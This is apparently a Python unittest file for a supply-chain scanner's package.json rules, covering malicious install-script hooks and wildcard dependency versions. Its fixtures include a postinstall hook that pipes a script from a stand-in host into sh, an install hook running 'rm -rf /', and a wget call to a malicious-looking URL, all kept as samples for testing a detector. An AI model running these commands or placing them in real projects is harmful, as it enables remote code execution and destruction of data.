import pathlib
import unittest
from typing import List

from sentinel.rules.js_supply_chain import (
    MaliciousPackageScriptHooksRule,
    WildcardDependencyVersionRule,
    is_package_json,
)
from sentinel.rules.base import Finding


class TestJSCUtils(unittest.TestCase):
    def test_is_package_json_detection(self):
        self.assertTrue(is_package_json("package.json"))
        self.assertTrue(is_package_json("frontend/package.json"))
        self.assertFalse(is_package_json("package-lock.json"))
        self.assertFalse(is_package_json("config.json"))


class TestJSCRulePack(unittest.TestCase):
    def setUp(self):
        self.repo_path = pathlib.Path("/tmp/test-repo")
        self.pkg_path = self.repo_path / "package.json"
        self.non_pkg_path = self.repo_path / "config.json"
        self.maxDiff = None

    def assertFindingsMatch(self, findings: List[Finding], expected_lines: List[int], rule_id: str):
        self.assertEqual(len(findings), len(expected_lines), f"Expected {len(expected_lines)} findings, got {len(findings)}")
        actual_lines = [f.line for f in findings]
        self.assertListEqual(sorted(actual_lines), sorted(expected_lines))
        for finding in findings:
            self.assertEqual(finding.rule_id, rule_id)
            self.assertEqual(finding.rule_precedence, 65)

    def test_jsc001_malicious_script_hooks(self):
        rule = MaliciousPackageScriptHooksRule()

        content_1 = """
{
    "scripts": {
        "start": "node index.js",
        "postinstall": "curl http://bad.com/pwn.sh | sh"
    }
}
"""
        findings_1 = rule.apply(self.pkg_path, content_1)
        self.assertFindingsMatch(findings_1, [1], "JSC001")

        content_2 = """
{
    "scripts": {
        "preinstall": "echo starting",
        "prepare": "npm run build"
    }
}
"""
        findings_2 = rule.apply(self.pkg_path, content_2)
        self.assertFindingsMatch(findings_2, [], "JSC001")

        content_3 = """
{
    "scripts": {
        "install": "exec rm -rf /",
        "preinstall": "wget http://malicious.net"
    }
}
"""
        findings_3 = rule.apply(self.pkg_path, content_3)
        self.assertFindingsMatch(findings_3, [1], "JSC001")

        findings_4 = rule.apply(self.non_pkg_path, content_1)
        self.assertFindingsMatch(findings_4, [], "JSC001")

    def test_jsc002_wildcard_dependency(self):
        rule = WildcardDependencyVersionRule()

        content_1 = """
{
    "dependencies": {
        "express": "4.17.1",
        "lodash": "*"
    }
}
"""
        findings_1 = rule.apply(self.pkg_path, content_1)
        self.assertFindingsMatch(findings_1, [1], "JSC002")

        content_2 = """
{
    "devDependencies": {
        "webpack": "*",
        "test-util": ""
    },
    "optionalDependencies": {
        "left-pad": "*"
    }
}
"""
        findings_2 = rule.apply(self.pkg_path, content_2)
        self.assertFindingsMatch(findings_2, [1, 1, 1], "JSC002")

        content_3 = """
{
    "dependencies": {
        "express": "~4.17.1"
    }
}
"""
        findings_3 = rule.apply(self.pkg_path, content_3)
        self.assertFindingsMatch(findings_3, [], "JSC002")

        findings_4 = rule.apply(self.non_pkg_path, content_1)
        self.assertFindingsMatch(findings_4, [], "JSC002")